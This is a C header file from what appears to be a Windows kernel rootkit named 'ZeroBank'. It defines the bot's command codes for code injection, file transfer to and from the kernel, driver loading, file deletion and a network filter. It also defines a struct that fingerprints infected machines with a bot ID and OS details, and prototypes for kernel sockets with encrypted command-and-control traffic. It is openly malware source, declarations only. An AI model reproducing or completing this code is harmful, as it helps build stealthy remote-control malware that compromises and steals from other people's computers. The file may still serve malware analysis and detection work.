#pragma once

#define ZB_INJECT							1
#define ZB_KERNEL_TO_USER_TRANSFER			2
#define ZB_USER_TO_KERNEL_TRANSFER			3
#define ZB_LOAD_DRIVER						4
#define ZB_DISCONNECT						5
#define ZB_EPROCESS							6
#define ZB_ETHREAD							7
#define ZB_MODULES							8
#define	ZB_FILE_EXPLORER					9
#define ZB_DELETE_FILE						10
#define ZB_INTERNAL_SYSTEM_INFORMATION		11
#define ZB_START_TDI_FILTER					12
#define ZB_STOP_TDI_FILTER					13
#define ZB_GET_BOT_CONNECTIONS				14


#define HTONS(a) (((0xFF&a)<<8) + ((0xFF00&a)>>8))
#define INETADDR(a, b, c, d) (a + (b<<8) + (c<<16) + (d<<24))
#define TDISUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

NTSTATUS NTAPI ZwQueryInformationProcess(
	_In_      HANDLE           ProcessHandle,
	_In_      PROCESSINFOCLASS ProcessInformationClass,
	_Out_     PVOID            ProcessInformation,
	_In_      ULONG            ProcessInformationLength,
	_Out_opt_ PULONG           ReturnLength
	);

// ROOTKIT_BOT_HEADER Basic information

typedef struct _ZEROBANK_BOT_HEADER
{
	CHAR Os[40];
	ULONG majorver;
	ULONG minorver;
	ULONG Build;
	CHAR Arch[5];
	CHAR BotId[255];
	BOOLEAN IsNtServer;
	CHAR Locale[255];
	CHAR lang[255];
}ZEROBANK_BOT_HEADER, *PZEROBANK_BOT_HEADER;

// ROOTKIT_PACKET Packet for general purposes

typedef struct _ZEROBANK_PACKET_TYPE
{
	UCHAR PacketType;
	UINT32 ProcessId_For_ETHREAD_plugin;
	UINT32 ProcessId_For_QueryProcessInformation_Plugin;
	CHAR FileName_For_FileExplorer_plugin[255];
	CHAR FileName_For_File_Transfer[255];
	CHAR FileName_For_File_Deletion[255];
}ZEROBANK_PACKET_TYPE, *PZEROBANK_PACKET_TYPE;

typedef struct _ZEROBANK_COMMUNICATION_CTX
{
	KEVENT Event;
	BOOLEAN Stop;
	PETHREAD Ethread;
	PROOTKIT_API_HASH g_Hash;
	PDRIVER_OBJECT pDriverObjectCtx;

}ZEROBANK_COMMUNICATION_CTX, *PZEROBANK_COMMUNICATION_CTX;

typedef struct _ZEROBANK_TDI_FILTER
{
	KEVENT Event;
	BOOLEAN Stop;
	PROOTKIT_API_HASH Hash;
	PDRIVER_OBJECT pDriverObject;
	PETHREAD Ethread;

}ZEROBANK_TDI_FILTER, *PZEROBANK_TDI_FILTER;

extern ZEROBANK_COMMUNICATION_CTX Ctx;

TDI_STATUS tdi_completion_routine(IN PDEVICE_OBJECT deviceobject, IN PIRP Irp, IN PVOID context);
INT send(IN PFILE_OBJECT socket, IN PCHAR data, IN ULONG datasize);
INT recv(IN PFILE_OBJECT socket, IN PCHAR data, IN ULONG datasize);
TDI_STATUS connect(IN PFILE_OBJECT *socket, IN USHORT port,IN ULONG oct1, IN ULONG oct2, IN ULONG oct3, IN ULONG oct4, IN PROOTKIT_API_HASH Hash);
TDI_STATUS bind(IN PHANDLE Handle, IN PFILE_OBJECT *socket, IN PROOTKIT_API_HASH Hash);
TDI_STATUS closesocket(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash);
TDI_STATUS destroy_connection_address(IN PFILE_OBJECT socket, IN PROOTKIT_API_HASH Hash);
TDI_STATUS create_address(IN PHANDLE *Handle, IN PFILE_OBJECT *socket, IN PROOTKIT_API_HASH Hash);
TDI_STATUS create_connection(IN PHANDLE Handle, IN PFILE_OBJECT **socket, IN PROOTKIT_API_HASH Hash);
INT tdi_send_crypted(IN PFILE_OBJECT socket, IN INT keytype, IN PVOID Data, IN ULONG Size, OUT PULONG SizeSent OPTIONAL);
INT tdi_recv_decrypted(IN PFILE_OBJECT socket, IN INT keytype, IN PVOID Data, IN ULONG Size, OUT PULONG SizeRecv OPTIONAL);
VOID zerobank_communication_worker_thread(PVOID Context);
NTSTATUS zerobank_init_communication_thread(OUT PZEROBANK_COMMUNICATION_CTX Context);



